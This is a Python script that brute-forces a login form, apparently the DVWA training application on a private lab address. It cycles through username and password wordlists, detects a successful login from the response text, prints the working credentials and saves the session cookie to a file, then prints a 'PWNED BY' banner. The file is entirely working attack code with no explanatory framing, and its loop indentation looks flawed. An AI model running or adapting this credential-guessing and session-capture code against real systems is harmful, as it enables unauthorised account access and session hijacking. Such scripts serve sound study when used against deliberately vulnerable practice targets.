import requests
import sys

user_file = open('usernames.lst')

pass_file = open('passwords.lst')

cookie_file = open('cookie.txt',"w")

#user_file = open('/usr/share/nmap/nselib/data/usernames.lst')
#pass_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = user_file.readlines()
pass_list = pass_file.readlines()
session = requests.Session()
found = 0

for user in user_list:
    user = user.rstrip()
    if(not user.startswith('#')):
        for pwd in pass_list:
            pwd = pwd.rstrip()
            if(not pwd.startswith('#')):
            	
                sys.stdout.write("\033[A")
                sys.stdout.write("\033[K")
            print (user, "-", pwd)
            headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}

            post_par ={'username': user, 'password': pwd, 'Login':'Login'}
            risp=session.post('http://192.168.50.101/dvwa/login.php',post_par)

            if(risp.text.find("failed") == -1):
                print(f"\n\n\nLog in!\nusername: {user}\npassword: {pwd}\n\nPHPSESSID:") 
                print(f"{session.cookies.get_dict().get('PHPSESSID')}\n\n")
                cookie_file.write(f"{session.cookies.get_dict().get('PHPSESSID')}")
                found=1
                break

    if(found==1): 
        break
print("PWNED BY")
print(" \n /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$")
print("| $$$ | $$| $$_____/|__  $$__/| $$__  $$ /$$__  $$|_  $$_/| $$__  $$| $$_____/| $$__  $$ /$$__  $$")
print("| $$$$| $$| $$         | $$   | $$  \ $$| $$  \ $$  | $$  | $$  \ $$| $$      | $$  \ $$| $$  \__/")
print("| $$ $$ $$| $$$$$      | $$   | $$$$$$$/| $$$$$$$$  | $$  | $$  | $$| $$$$$   | $$$$$$$/|  $$$$$$ ")
print("| $$  $$$$| $$__/      | $$   | $$__  $$| $$__  $$  | $$  | $$  | $$| $$__/   | $$__  $$ \____  $$")
print("| $$\  $$$| $$         | $$   | $$  \ $$| $$  | $$  | $$  | $$  | $$| $$      | $$  \ $$ /$$  \ $$")
print("| $$ \  $$| $$$$$$$$   | $$   | $$  | $$| $$  | $$ /$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/")
print("|__/  \__/|________/   |__/   |__/  |__/|__/  |__/|______/|_______/ |________/|__/  |__/ \______/ ")